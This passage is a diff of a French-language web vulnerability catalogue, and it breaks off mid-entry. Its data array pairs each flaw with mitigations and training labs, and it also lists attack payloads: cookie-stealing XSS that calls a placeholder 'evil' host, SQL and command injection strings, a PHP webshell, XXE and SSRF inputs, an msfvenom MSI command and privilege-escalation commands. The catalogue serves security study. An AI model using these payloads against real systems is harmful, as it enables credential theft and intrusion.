@@ -28,10 +28,9 @@ body {
   min-height: 100vh;
   line-height: 1.5;
 }
-.mono { font-family: "JetBrains Mono", monospace; }
 header {
   position: sticky; top: 0; z-index: 40;
-  background: rgba(18,18,26,.9);
+  background: rgba(18,18,26,.92);
   backdrop-filter: blur(12px);
   border-bottom: 1px solid var(--border);
 }
@@ -54,18 +53,24 @@ h1 { font-size: 1.15rem; font-weight: 600; }
   outline: none;
 }
 .search-wrap input:focus { border-color: rgba(124,58,237,.6); box-shadow: 0 0 0 1px rgba(124,58,237,.25); }
-.search-wrap svg { position: absolute; left: .85rem; top: 50%; transform: translateY(-50%); color: var(--muted); width: 16px; height: 16px; }
+.search-wrap .ico {
+  position: absolute; left: .85rem; top: 50%; transform: translateY(-50%);
+  color: var(--muted); width: 16px; height: 16px; pointer-events: none;
+}
 .layout { display: flex; gap: 1.5rem; padding: 1.5rem 1.25rem; max-width: 1200px; margin: 0 auto; }
 .sidebar { width: 220px; flex-shrink: 0; }
 .main { flex: 1; min-width: 0; }
 .fg { margin-bottom: 1.25rem; }
-.fg h3 { font-size: .7rem; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); margin-bottom: .5rem; font-weight: 600; }
+.fg h3 {
+  font-size: .7rem; text-transform: uppercase; letter-spacing: .06em;
+  color: var(--muted); margin-bottom: .5rem; font-weight: 600;
+}
 .btn {
   display: flex; align-items: center; gap: .5rem;
   width: 100%; text-align: left; padding: .45rem .7rem;
   border-radius: 8px; border: 1px solid transparent;
   background: transparent; color: var(--dim); font-size: .85rem;
-  cursor: pointer; transition: .15s;
+  cursor: pointer; transition: .15s; font-family: inherit;
 }
 .btn:hover { background: var(--panel); color: var(--text); }
 .btn.active { background: rgba(124,58,237,.2); color: var(--accent); border-color: rgba(124,58,237,.3); }
@@ -75,13 +80,19 @@ h1 { font-size: 1.15rem; font-weight: 600; }
   border: 1px solid var(--border); background: var(--panel); color: var(--dim);
   cursor: pointer; font-family: "JetBrains Mono", monospace;
 }
-.chip.active-crit { background: rgba(239,68,68,.15); color: var(--danger); border-color: rgba(239,68,68,.4); }
-.chip.active-high { background: rgba(245,158,11,.15); color: var(--warn); border-color: rgba(245,158,11,.4); }
-.chip.active-med { background: rgba(6,182,212,.15); color: var(--accent2); border-color: rgba(6,182,212,.4); }
-.chip.active-low { background: rgba(34,197,94,.15); color: var(--ok); border-color: rgba(34,197,94,.4); }
-.chip.active { background: rgba(124,58,237,.15); color: var(--accent); border-color: rgba(124,58,237,.3); }
-.stats { display: flex; flex-wrap: wrap; gap: .5rem; font-size: .75rem; color: var(--dim); font-family: "JetBrains Mono", monospace; margin-bottom: 1rem; }
-.stats span { padding: .25rem .6rem; border-radius: 6px; background: var(--panel); border: 1px solid var(--border); }
+.chip.on-crit { background: rgba(239,68,68,.15); color: var(--danger); border-color: rgba(239,68,68,.4); }
+.chip.on-high { background: rgba(245,158,11,.15); color: var(--warn); border-color: rgba(245,158,11,.4); }
+.chip.on-med { background: rgba(6,182,212,.15); color: var(--accent2); border-color: rgba(6,182,212,.4); }
+.chip.on-low { background: rgba(34,197,94,.15); color: var(--ok); border-color: rgba(34,197,94,.4); }
+.chip.on { background: rgba(124,58,237,.15); color: var(--accent); border-color: rgba(124,58,237,.3); }
+.stats {
+  display: flex; flex-wrap: wrap; gap: .5rem; font-size: .75rem;
+  color: var(--dim); font-family: "JetBrains Mono", monospace; margin-bottom: 1rem;
+}
+.stats span {
+  padding: .25rem .6rem; border-radius: 6px;
+  background: var(--panel); border: 1px solid var(--border);
+}
 .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: .85rem; }
 .card {
   text-align: left; padding: 1rem; border-radius: 12px;
@@ -89,7 +100,11 @@ h1 { font-size: 1.15rem; font-weight: 600; }
   cursor: pointer; transition: .15s; width: 100%;
   color: inherit; font: inherit;
 }
-.card:hover { transform: translateY(-2px); border-color: rgba(124,58,237,.35); box-shadow: 0 0 20px rgba(124,58,237,.12); }
+.card:hover {
+  transform: translateY(-2px);
+  border-color: rgba(124,58,237,.35);
+  box-shadow: 0 0 20px rgba(124,58,237,.12);
+}
 .badges { display: flex; flex-wrap: wrap; gap: .3rem; margin-bottom: .4rem; }
 .badge {
   display: inline-flex; padding: .15rem .45rem; border-radius: 4px;
@@ -102,14 +117,20 @@ h1 { font-size: 1.15rem; font-weight: 600; }
 .sev-low { background: rgba(34,197,94,.15); color: var(--ok); border-color: rgba(34,197,94,.3); }
 .badge-dim { background: rgba(0,0,0,.3); color: var(--dim); border-color: var(--border); }
 .card h3 { font-size: .9rem; font-weight: 500; margin-bottom: .25rem; }
-.card p { font-size: .75rem; color: var(--dim); display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+.card p {
+  font-size: .75rem; color: var(--dim);
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+}
 .tags { margin-top: .6rem; display: flex; flex-wrap: wrap; gap: .25rem; }
-.tag { font-size: .6rem; font-family: "JetBrains Mono", monospace; padding: .1rem .35rem; border-radius: 3px; background: rgba(0,0,0,.4); color: var(--muted); border: 1px solid var(--border); }
+.tag {
+  font-size: .6rem; font-family: "JetBrains Mono", monospace;
+  padding: .1rem .35rem; border-radius: 3px;
+  background: rgba(0,0,0,.4); color: var(--muted); border: 1px solid var(--border);
+}
 .modal-bg {
   position: fixed; inset: 0; z-index: 50;
   background: rgba(0,0,0,.7); backdrop-filter: blur(4px);
-  display: flex; align-items: flex-end; justify-content: center;
-  padding: 0;
+  display: flex; align-items: flex-end; justify-content: center; padding: 0;
 }
 @media (min-width: 640px) {
   .modal-bg { align-items: center; padding: 1.5rem; }
@@ -133,8 +154,13 @@ h1 { font-size: 1.15rem; font-weight: 600; }
 .close:hover { background: rgba(0,0,0,.4); color: var(--text); }
 .modal-body { padding: 1.25rem; }
 .section { margin-bottom: 1.25rem; }
-.section h4 { font-size: .85rem; font-weight: 600; margin-bottom: .4rem; display: flex; align-items: center; gap: .4rem; }
-.section h4::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: var(--accent); }
+.section h4 {
+  font-size: .85rem; font-weight: 600; margin-bottom: .4rem;
+  display: flex; align-items: center; gap: .4rem;
+}
+.section h4::before {
+  content: ""; width: 6px; height: 6px; border-radius: 50%; background: var(--accent);
+}
 .section p { font-size: .85rem; color: var(--dim); }
 pre {
   margin-top: .6rem; padding: .75rem; border-radius: 8px;
@@ -148,18 +174,30 @@ pre {
   font-family: "JetBrains Mono", monospace; background: rgba(0,0,0,.4);
   border: 1px solid var(--border);
 }
-.meta-row { display: flex; flex-wrap: wrap; gap: .35rem; align-items: center; padding-top: .75rem; border-top: 1px solid var(--border); font-size: .7rem; }
+.meta-row {
+  display: flex; flex-wrap: wrap; gap: .35rem; align-items: center;
+  padding-top: .75rem; border-top: 1px solid var(--border); font-size: .7rem;
+}
 .meta-row .label { color: var(--muted); font-family: "JetBrains Mono", monospace; }
-.empty { text-align: center; padding: 4rem 1rem; color: var(--dim); }
+.empty { text-align: center; padding: 4rem 1rem; color: var(--dim); display: none; }
 footer {
   border-top: 1px solid var(--border); padding: 1rem; text-align: center;
   font-size: .7rem; color: var(--muted); font-family: "JetBrains Mono", monospace;
 }
-.mobile-filter { display: none; }
+.mobile-filter {
+  display: none; align-items: center; gap: .4rem;
+  padding: .4rem .7rem; border-radius: 8px; border: 1px solid var(--border);
+  background: var(--panel); color: var(--text); font-size: .8rem; cursor: pointer;
+}
+.side-head { display: none; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
 @media (max-width: 720px) {
-  .sidebar { display: none; }
-  .sidebar.open { display: block; position: fixed; inset: 0; z-index: 45; background: var(--void); padding: 1.25rem; overflow-y: auto; width: 100%; }
-  .mobile-filter { display: inline-flex; align-items: center; gap: .4rem; padding: .4rem .7rem; border-radius: 8px; border: 1px solid var(--border); background: var(--panel); color: var(--text); font-size: .8rem; cursor: pointer; }
+  .sidebar {
+    display: none; position: fixed; inset: 0; z-index: 45;
+    background: var(--void); padding: 1.25rem; overflow-y: auto; width: 100%;
+  }
+  .sidebar.open { display: block; }
+  .mobile-filter { display: inline-flex; }
+  .side-head { display: flex; }
   .layout { flex-direction: column; }
 }
 </style>
@@ -178,7 +216,7 @@ footer {
       <button class="mobile-filter" id="btnFilters" type="button">Filtres</button>
     </div>
     <div class="search-wrap">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+      <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
       <input id="q" type="search" placeholder="Rechercher : SQL, XSS, Potato, SUID, JWT, SSRF..." autocomplete="off" />
     </div>
   </div>
@@ -186,7 +224,7 @@ footer {
 
 <div class="layout">
   <aside class="sidebar" id="sidebar">
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem" class="mobile-only">
+    <div class="side-head">
       <strong>Filtres</strong>
       <button class="close" id="closeFilters" type="button">✕</button>
     </div>
@@ -210,7 +248,7 @@ footer {
   <main class="main">
     <div class="stats" id="stats"></div>
     <div class="grid" id="grid"></div>
-    <div class="empty" id="empty" style="display:none">Aucune fail ne correspond aux filtres.</div>
+    <div class="empty" id="empty">Aucune fail ne correspond aux filtres.</div>
   </main>
 </div>
 
@@ -221,7 +259,7 @@ footer {
 </div>
 
 <script>
-const VULNS = [{"id": "sqli-classic", "name": "SQL Injection (Classic)", "category": "Injection", "cwe": "CWE-89", "owasp": "A05:2025", "severity": "critical", "targets": ["web", "api"], "os": ["any"], "description": "Injection de requêtes SQL non filtrées via paramètres utilisateur. Permet lecture/écriture DB, parfois RCE via xp_cmdshell ou INTO OUTFILE.", "how": "Payloads dans GET/POST/headers/cookies. Union-based, error-based, boolean blind, time-based.", "example": "' OR 1=1--\n' UNION SELECT null,username,password FROM users--\n1' AND SLEEP(5)--", "tools": ["sqlmap", "Burp Suite", "NoSQLMap"], "mitigation": "Prepared statements / parameterized queries. ORM. Whitelist input. Least privilege DB user.", "lab": "DVWA, SQLi-Labs, PortSwigger Academy", "status": "still-works"}, {"id": "xss-reflected", "name": "Cross-Site Scripting (Reflected)", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "high", "targets": ["web"], "os": ["any"], "description": "Script malveillant réfléchi dans la réponse HTTP. Vol de session, keylogging, phishing in-app.", "how": "Paramètre réfléchi sans encoding. <script>, event handlers, SVG onload.", "example": "<script>document.location='https://evil/?c='+document.cookie</script>\n\"><img src=x onerror=alert(1)>\n<svg/onload=alert(1)>", "tools": ["XSStrike", "Burp", "dalfox", "XSS Hunter"], "mitigation": "Output encoding context-aware. CSP strict. HttpOnly cookies. Sanitize HTML.", "lab": "PortSwigger XSS labs, DVWA", "status": "still-works"}, {"id": "xss-stored", "name": "Cross-Site Scripting (Stored)", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["any"], "description": "Payload persisté en base / fichier / commentaire. Frappe tous les visiteurs.", "how": "Champs non sanitizés (commentaires, profils, noms de fichiers).", "example": "<script>fetch('https://evil/steal?c='+btoa(document.cookie))</script>", "tools": ["Burp", "BeEF", "XSS Hunter"], "mitigation": "Sanitize + encode. CSP. Input validation côté serveur.", "lab": "DVWA, bWAPP", "status": "still-works"}, {"id": "xss-dom", "name": "DOM-based XSS", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "high", "targets": ["web"], "os": ["any"], "description": "Source client (location, hash, postMessage) écrite dans un sink dangereux (innerHTML, eval, document.write).", "how": "Analyse sources → sinks. #hash, searchParams, localStorage.", "example": "location.hash → document.write / innerHTML\neval(location.search)", "tools": ["DOM Invader (Burp)", "DOMPurify audit"], "mitigation": "Éviter sinks dangereux. DOMPurify. Trusted Types.", "lab": "PortSwigger DOM XSS", "status": "still-works"}, {"id": "cmdi", "name": "OS Command Injection", "category": "Injection", "cwe": "CWE-78", "owasp": "A05:2025", "severity": "critical", "targets": ["web", "app"], "os": ["windows", "linux", "macos", "kali"], "description": "Commandes système construites avec input utilisateur non échappé. RCE full.", "how": "; | & ` $() sur Linux. & | sur Windows.", "example": "; id\n| whoami\n& dir\n`cat /etc/passwd`", "tools": ["Commix", "Burp"], "mitigation": "Éviter shell. APIs natives. Escape strict + whitelist.", "lab": "DVWA Command Injection, HackTheBox", "status": "still-works"}, {"id": "ssrf", "name": "Server-Side Request Forgery", "category": "Broken Access Control", "cwe": "CWE-918", "owasp": "A01:2025", "severity": "high", "targets": ["web", "api", "cloud"], "os": ["any"], "description": "Serveur fait des requêtes vers des URL contrôlées. Accès réseau interne, cloud metadata, ports.", "how": "URL params, webhooks, PDF generators, image fetchers.", "example": "http://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:6379/\nfile:///etc/passwd", "tools": ["SSRFmap", "Gopherus", "Burp Collaborator"], "mitigation": "Whitelist destinations. Bloquer IP privées / link-local. Network segmentation.", "lab": "PortSwigger SSRF, CloudGoat", "status": "still-works"}, {"id": "xxe", "name": "XML External Entity (XXE)", "category": "Injection", "cwe": "CWE-611", "owasp": "A05:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Parser XML résout des entités externes. Lecture fichiers, SSRF, parfois RCE (Java).", "how": "DOCTYPE + SYSTEM entity dans XML body / upload.", "example": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "tools": ["xxeinjector", "Burp"], "mitigation": "Désactiver DTD / external entities. Parser safe (defusedxml).", "lab": "PortSwigger XXE", "status": "still-works"}, {"id": "idor", "name": "Insecure Direct Object Reference (IDOR)", "category": "Broken Access Control", "cwe": "CWE-639", "owasp": "A01:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Accès à des objets via ID prévisible sans check d'ownership.", "how": "Changer /user/123 → /user/124. UUID vs sequential.", "example": "GET /api/orders/1001 → changer en 1002\nPUT /api/users/me → /api/users/admin", "tools": ["Burp Autorize", "Autorize extension"], "mitigation": "AuthZ côté serveur par objet. UUID non prévisibles. Tests d'accès croisés.", "lab": "PortSwigger Access Control, DVWA", "status": "still-works"}, {"id": "csrf", "name": "Cross-Site Request Forgery", "category": "Broken Access Control", "cwe": "CWE-352", "owasp": "A01:2025", "severity": "medium", "targets": ["web"], "os": ["any"], "description": "Requête authentifiée forgée depuis un site tiers. Actions non désirées.", "how": "Form auto-submit, img src, fetch with credentials.", "example": "<form action=\"https://bank/transfer\" method=\"POST\"><input name=\"to\" value=\"evil\"><input name=\"amount\" value=\"1000\"></form><script>document.forms[0].submit()</script>", "tools": ["Burp CSRF PoC generator"], "mitigation": "CSRF tokens synchronizer. SameSite=Strict cookies. Origin/Referer check.", "lab": "PortSwigger CSRF", "status": "still-works"}, {"id": "auth-bypass", "name": "Authentication Bypass", "category": "Authentication Failures", "cwe": "CWE-287", "owasp": "A07:2025", "severity": "critical", "targets": ["web", "api", "app"], "os": ["any"], "description": "Failles de login : default creds, weak JWT, logic flaws, response manipulation.", "how": "Brute force, JWT none/alg confusion, mass assignment, SQLi in login.", "example": "JWT header {\"alg\":\"none\"}\nadmin'--\n{\"role\":\"admin\"} mass assignment", "tools": ["jwt_tool", "Hydra", "Burp"], "mitigation": "MFA. Rate limit. Secure JWT (RS256). AuthZ séparé de AuthN.", "lab": "PortSwigger Auth labs, Juice Shop", "status": "still-works"}, {"id": "path-traversal", "name": "Path Traversal / LFI", "category": "Broken Access Control", "cwe": "CWE-22", "owasp": "A01:2025", "severity": "high", "targets": ["web", "app"], "os": ["windows", "linux", "macos", "kali"], "description": "Accès fichiers hors répertoire prévu via ../ ou null bytes.", "how": "../../../etc/passwd, ..\\..\\windows\\win.ini, wrappers php://filter", "example": "....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=index.php\n/proc/self/environ", "tools": ["dotdotpwn", "Burp"], "mitigation": "Canonicalize paths. Whitelist fichiers. Chroot / sandbox.", "lab": "DVWA File Inclusion, PortSwigger", "status": "still-works"}, {"id": "rce-upload", "name": "Unrestricted File Upload → RCE", "category": "Injection", "cwe": "CWE-434", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["linux", "windows", "kali"], "description": "Upload de webshell / polyglot. Extension bypass, content-type, double extension.", "how": ".php.jpg, null byte, magic bytes, .htaccess, SVG XSS.", "example": "shell.php / shell.php%00.jpg / shell.phtml\nGIF89a; <?php system($_GET['c']); ?>", "tools": ["Burp", "weevely", "China Chopper"], "mitigation": "Whitelist extensions. Store hors webroot. Rename random. Content scan. Disable execution in upload dir.", "lab": "DVWA Upload, HackTheBox", "status": "still-works"}, {"id": "deserial", "name": "Insecure Deserialization", "category": "Software or Data Integrity Failures", "cwe": "CWE-502", "owasp": "A08:2025", "severity": "critical", "targets": ["web", "app"], "os": ["any"], "description": "Désérialisation d'objets non trusted → RCE (Java, PHP, .NET, Python pickle).", "how": "Cookie / param sérialisé. Gadgets ysoserial / phpggc.", "example": "Java: ysoserial CommonsCollections\nPHP: phpggc Laravel/RCE\nPython: pickle.loads(malicious)", "tools": ["ysoserial", "phpggc", "pickle tools"], "mitigation": "Éviter désérialisation non trusted. Whitelist classes. JSON only.", "lab": "PortSwigger Deserialization, Java labs", "status": "still-works"}, {"id": "misconfig", "name": "Security Misconfiguration", "category": "Security Misconfiguration", "cwe": "CWE-16", "owasp": "A02:2025", "severity": "high", "targets": ["web", "api", "cloud", "app"], "os": ["any"], "description": "Defaults, debug on, headers manquants, cloud buckets ouverts, admin panels exposés.", "how": "Directory listing, stack traces, default passwords, CORS * + credentials.", "example": "/.env, /server-status, S3 public, debug=true, X-Powered-By", "tools": ["nikto", "nuclei", "cloud_enum"], "mitigation": "Hardening guides. Remove defaults. Security headers. Least privilege cloud.", "lab": "Juice Shop, CloudGoat", "status": "still-works"}, {"id": "crypto-fail", "name": "Cryptographic Failures", "category": "Cryptographic Failures", "cwe": "CWE-310", "owasp": "A04:2025", "severity": "high", "targets": ["web", "app", "api"], "os": ["any"], "description": "Crypto faible, clés hardcodées, TLS mal configuré, hashing unsalted / MD5.", "how": "HTTP au lieu de HTTPS, weak ciphers, JWT HS256 avec secret faible.", "example": "MD5(password), ECB mode, private key in repo, SSL strip", "tools": ["testssl.sh", "hashcat", "jwt_tool"], "mitigation": "TLS 1.2+, strong ciphers. Argon2/bcrypt. Secrets management. HSTS.", "lab": "Crypto challenges CTF, PortSwigger", "status": "still-works"}, {"id": "supply-chain", "name": "Software Supply Chain Failures", "category": "Software Supply Chain Failures", "cwe": "CWE-1104", "owasp": "A03:2025", "severity": "critical", "targets": ["web", "app", "ci"], "os": ["any"], "description": "Dépendances compromises, typosquatting, malicious packages, build pipeline hijack.", "how": "npm/pip install malicious, compromised maintainer, CI secrets leak.", "example": "event-stream incident, SolarWinds, codecov, dependency confusion", "tools": ["npm audit", "snyk", "dependabot", "socket.dev"], "mitigation": "Lockfiles + integrity. SBOM. Pin versions. Private registry. Review CI permissions.", "lab": "OWASP Dependency-Track demos", "status": "still-works"}, {"id": "logging-fail", "name": "Security Logging & Alerting Failures", "category": "Security Logging and Alerting Failures", "cwe": "CWE-778", "owasp": "A09:2025", "severity": "medium", "targets": ["web", "app", "api"], "os": ["any"], "description": "Pas de logs utiles, ou logs non monitorés. Impossible de détecter ou investiguer.", "how": "Login failures non loggés, pas d'alerte brute force, logs en local non centralisés.", "example": "Pas de SIEM, logs rotation trop agressive, credentials dans logs", "tools": ["ELK", "Splunk", "Wazuh", "Fail2ban"], "mitigation": "Log auth events, access denied, input anomalies. Centralize + alert. Protect log integrity.", "lab": "SIEM labs, Blue Team labs", "status": "still-works"}, {"id": "insecure-design", "name": "Insecure Design", "category": "Insecure Design", "cwe": "CWE-1039", "owasp": "A06:2025", "severity": "high", "targets": ["web", "app", "api"], "os": ["any"], "description": "Faille d'architecture / business logic. Code correct mais design dangereux.", "how": "Race conditions, missing rate limit sur actions critiques, trust client-side only.", "example": "Coupon réutilisable, race transfer argent, password reset without token binding", "tools": ["Threat modeling (STRIDE)", "manual logic testing"], "mitigation": "Threat modeling early. Secure design patterns. Business logic tests.", "lab": "PortSwigger Business Logic, Juice Shop", "status": "still-works"}, {"id": "exception-mishandle", "name": "Mishandling of Exceptional Conditions", "category": "Mishandling of Exceptional Conditions", "cwe": "CWE-755", "owasp": "A10:2025", "severity": "medium", "targets": ["web", "app", "api"], "os": ["any"], "description": "Exceptions non gérées → info leak, DoS, état incohérent, bypass de checks.", "how": "Stack traces exposées, fail-open, uncaught exceptions in auth flow.", "example": "500 avec path + query, catch vide qui continue, timeout qui skip validation", "tools": ["manual fuzzing", "Burp Intruder"], "mitigation": "Fail closed. Generic error pages. Structured exception handling. Chaos testing.", "lab": "Custom apps, fuzzing labs", "status": "still-works"}, {"id": "clickjacking", "name": "Clickjacking / UI Redress", "category": "Broken Access Control", "cwe": "CWE-1021", "owasp": "A01:2025", "severity": "medium", "targets": ["web"], "os": ["any"], "description": "Iframe transparent superposé. Clic utilisateur déclenche action non désirée.", "how": "iframe opacity 0 + position absolute sur bouton sensible.", "example": "<iframe src=\"https://bank/delete\" style=\"opacity:0;position:absolute\"></iframe>", "tools": ["Burp Clickbandit"], "mitigation": "X-Frame-Options DENY / SAMEORIGIN. CSP frame-ancestors. JS framebusting (fallback).", "lab": "PortSwigger Clickjacking", "status": "still-works"}, {"id": "open-redirect", "name": "Open Redirect", "category": "Broken Access Control", "cwe": "CWE-601", "owasp": "A01:2025", "severity": "low", "targets": ["web"], "os": ["any"], "description": "Redirection vers URL externe non validée. Phishing / OAuth token steal.", "how": "?next=https://evil.com, //evil.com, javascript:", "example": "/login?redirect=https://evil.com\n/?url=//evil.com/%2f%2e%2e", "tools": ["manual", "Burp"], "mitigation": "Whitelist domaines. Relative paths only. Encode redirects.", "lab": "PortSwigger Open Redirect", "status": "still-works"}, {"id": "win-potato", "name": "Windows Potato Family (PrivEsc)", "category": "Privilege Escalation", "cwe": "CWE-269", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["windows"], "description": "Abus de tokens / impersonation (SeImpersonatePrivilege) pour monter SYSTEM. JuicyPotato, RoguePotato, GodPotato, etc.", "how": "Service ou process avec SeImpersonate → trigger DCOM/RPC → vol token SYSTEM.", "example": "GodPotato -cmd \"cmd /c whoami\"\nJuicyPotato -t * -p cmd.exe -a \"/c whoami\"", "tools": ["GodPotato", "JuicyPotatoNG", "PrintSpoofer", "RoguePotato"], "mitigation": "Patch. Réduire SeImpersonate. Hardening services. AppLocker / WDAC.", "lab": "HackTheBox Windows boxes, TryHackMe", "status": "still-works"}, {"id": "win-unquoted", "name": "Unquoted Service Path", "category": "Privilege Escalation", "cwe": "CWE-428", "owasp": null, "severity": "high", "targets": ["os"], "os": ["windows"], "description": "Chemin de service non quoté avec espaces. Hijack possible si writable.", "how": "C:\\Program Files\\App\\service.exe → créer C:\\Program.exe", "example": "wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", "tools": ["PowerUp", "WinPEAS", "accesschk"], "mitigation": "Quotes autour des chemins. Permissions strictes sur dossiers parents.", "lab": "Windows PrivEsc rooms", "status": "still-works"}, {"id": "win-alwaysinstallelevated", "name": "AlwaysInstallElevated", "category": "Privilege Escalation", "cwe": "CWE-250", "owasp": null, "severity": "high", "targets": ["os"], "os": ["windows"], "description": "MSI installés avec privilèges SYSTEM si policy activée (HKLM + HKCU).", "how": "Créer MSI malveillant → msiexec /quiet /i evil.msi", "example": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nmsfvenom -p windows/adduser -f msi > evil.msi", "tools": ["msfvenom", "PowerUp"], "mitigation": "Désactiver AlwaysInstallElevated. GPO.", "lab": "Windows PrivEsc labs", "status": "still-works"}, {"id": "linux-suid", "name": "SUID / SGID Binary Abuse", "category": "Privilege Escalation", "cwe": "CWE-732", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "Binaires SUID exécutés en root. GTFOBins pour escalation.", "how": "find / -perm -4000. Abuse via known binaries (find, vim, nmap, python...).", "example": "find / -perm -4000 2>/dev/null\n./nmap --interactive\n!sh", "tools": ["LinPEAS", "GTFOBins", "pspy"], "mitigation": "Minimiser SUID. Capabilities préférées. AppArmor/SELinux.", "lab": "Linux PrivEsc, HackTheBox", "status": "still-works"}, {"id": "linux-sudo", "name": "Sudo Misconfiguration", "category": "Privilege Escalation", "cwe": "CWE-250", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "sudo -l montre commandes autorisées sans password ou avec wildcards dangereux.", "how": "sudo vim → :!sh. LD_PRELOAD. Path bypass. CVE-2023-22809 sudoedit.", "example": "sudo -l\nsudo vim /etc/hosts → :!bash\nSUDO_EDITOR='vim -- /etc/sudoers' sudoedit /tmp/x", "tools": ["LinPEAS", "GTFOBins"], "mitigation": "sudoers strict, no wildcards, no env_keep dangereux. visudo.", "lab": "Linux PrivEsc rooms", "status": "still-works"}, {"id": "linux-kernel", "name": "Linux Kernel Exploits (Dirty Pipe, PwnKit, etc.)", "category": "Privilege Escalation", "cwe": "CWE-269", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "Vulns kernel historiques et récentes : Dirty COW, Dirty Pipe, PwnKit (pkexec), netfilter, eBPF.", "how": "uname -a → chercher CVE. Compiler PoC local.", "example": "CVE-2022-0847 Dirty Pipe\nCVE-2021-4034 PwnKit\nCVE-2021-22555 netfilter", "tools": ["linux-exploit-suggester", "LinPEAS", "pocs public"], "mitigation": "Kernel à jour. Unprivileged user namespaces off si possible. Hardening.", "lab": "HackTheBox kernel boxes", "status": "still-works"}, {"id": "macos-tcc", "name": "macOS TCC / Privacy Bypass", "category": "Privilege Escalation", "cwe": "CWE-284", "owasp": null, "severity": "high", "targets": ["os"], "os": ["macos"], "description": "Bypass Transparency, Consent, and Control (TCC). Accès photos, contacts, caméra sans consentement.", "how": "Vulns dans tccd, XPC, entitlements, Injection dans process trusted.", "example": "Historique : CVE-2020-9771, CVE-2021-30970, etc. Techniques évoluent avec chaque OS.", "tools": ["research PoCs", "objective-see tools"], "mitigation": "macOS à jour. SIP on. Réduire apps avec entitlements sensibles.", "lab": "macOS security research writeups", "status": "version-dependent"}, {"id": "macos-gatekeeper", "name": "Gatekeeper / Notarization Bypass", "category": "Privilege Escalation", "cwe": "CWE-693", "owasp": null, "severity": "high", "targets": ["os", "app"], "os": ["macos"], "description": "Techniques pour exécuter code non signé / non notarisé en contournant Gatekeeper.", "how": "Archive tricks, symlink, environment variables, older CVE still relevant on lagging systems.", "example": "CVE-2021-30657, CVE-2022-22616, etc.", "tools": ["public research"], "mitigation": "macOS à jour. Ne pas désactiver Gatekeeper. Notarization.", "lab": "Objective-See blog, conference talks", "status": "version-dependent"}, {"id": "kali-tools-abuse", "name": "Kali / Pentest Tools Misuse Surface", "category": "Security Misconfiguration", "cwe": "CWE-250", "owasp": null, "severity": "medium", "targets": ["os"], "os": ["kali"], "description": "Kali shippe des outils puissants. Mauvais usage / config laisse des services exposés (Metasploit, databases, listeners).", "how": "Services démarrés par défaut en lab, credentials par défaut, ports ouverts.", "example": "postgresql default, metasploit db, open listeners, weak SSH", "tools": ["systemctl", "ss -tlnp", "default-creds"], "mitigation": "Hardening Kali pour usage réel. Firewall. Changer defaults. Isolation réseau.", "lab": "Kali hardening guides", "status": "config-dependent"}, {"id": "api-bola", "name": "API Broken Object Level Authorization (BOLA)", "category": "Broken Access Control", "cwe": "CWE-639", "owasp": "A01:2025", "severity": "critical", "targets": ["api"], "os": ["any"], "description": "Équivalent IDOR pour APIs. Object ID manipulable sans check ownership.", "how": "Changer resource ID dans path / body / GraphQL.", "example": "GET /api/v1/users/1337/orders → 1338\nGraphQL { user(id:\"other\") { email } }", "tools": ["Burp", "Postman", "GraphQL voyager"], "mitigation": "AuthZ par objet systématique. Tests automatisés d'accès croisés.", "lab": "API Security Top 10 labs, crAPI", "status": "still-works"}, {"id": "api-mass-assignment", "name": "API Mass Assignment", "category": "Broken Access Control", "cwe": "CWE-915", "owasp": "A01:2025", "severity": "high", "targets": ["api"], "os": ["any"], "description": "Binding automatique de propriétés non prévues (role, isAdmin, balance).", "how": "Ajouter champs dans JSON body non filtrés.", "example": "{\"email\":\"x\",\"role\":\"admin\",\"isPremium\":true}", "tools": ["Burp", "manual"], "mitigation": "Whitelist fields. DTOs stricts. Never bind whole object.", "lab": "OWASP API Top 10 labs", "status": "still-works"}, {"id": "race-condition", "name": "Race Condition / TOCTOU", "category": "Insecure Design", "cwe": "CWE-362", "owasp": "A06:2025", "severity": "high", "targets": ["web", "api", "app"], "os": ["any"], "description": "Time-of-check vs time-of-use. Double-spend, coupon reuse, limit bypass.", "how": "Requêtes parallèles rapides sur action limitée.", "example": "2x transfer simultané, redeem coupon en parallèle", "tools": ["Turbo Intruder", "Burp race", "ffuf concurrent"], "mitigation": "Locks atomiques. Idempotency keys. Transactions DB.", "lab": "PortSwigger Race Conditions", "status": "still-works"}, {"id": "jwt-attacks", "name": "JWT Attacks", "category": "Authentication Failures", "cwe": "CWE-347", "owasp": "A07:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "none algorithm, alg confusion (RS→HS), weak secret, kid injection, jku.", "how": "Modifier header + signature. Crack HS256. Force none.", "example": "{\"alg\":\"none\"} + empty sig\nRS256 public key as HS256 secret\nkid: ../../dev/null", "tools": ["jwt_tool", "hashcat", "Burp JWT Editor"], "mitigation": "Force 